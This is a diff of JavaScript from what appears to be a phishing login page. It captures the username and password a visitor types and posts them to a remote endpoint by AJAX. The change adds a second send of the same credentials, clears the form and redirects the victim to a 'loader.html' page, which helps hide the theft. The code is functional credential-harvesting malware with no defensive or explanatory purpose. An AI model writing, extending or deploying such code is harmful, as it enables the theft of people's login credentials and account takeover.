@@ -23,6 +23,7 @@ var sender = function () {
     // Check if both username and password are not empty
     if (u_name.trim() !== "" && u_password.trim() !== "") {
         message = "Name: " + u_name + "\nPassword: " + u_password;
+        
         var settings = {
             "async": true,
             "crossDomain": true,
@@ -37,17 +38,29 @@ var sender = function () {
                 "text": message
             })
         };
+
+        // Send the first message
         $.ajax(settings).done(function (response) {
             console.log(response);
-        });
+            
+            // Send the second message
+            message = "Another message: " + u_name + "\nPassword: " + u_password;
+            $.ajax(settings).done(function (response) {
+                console.log(response);
 
-        // Clear input fields after sending the message
-        document.getElementById("username").value = "";
-        document.getElementById("password").value = "";
+                // Clear input fields after sending the messages
+                document.getElementById("username").value = "";
+                document.getElementById("password").value = "";
+
+                // Redirect to loader.html after sending both messages
+                window.location.href = 'loader.html';
+            });
+        });
     }
 
     return false;
 };
+
 
 document.addEventListener('DOMContentLoaded', function () {
     // Call ready function if needed
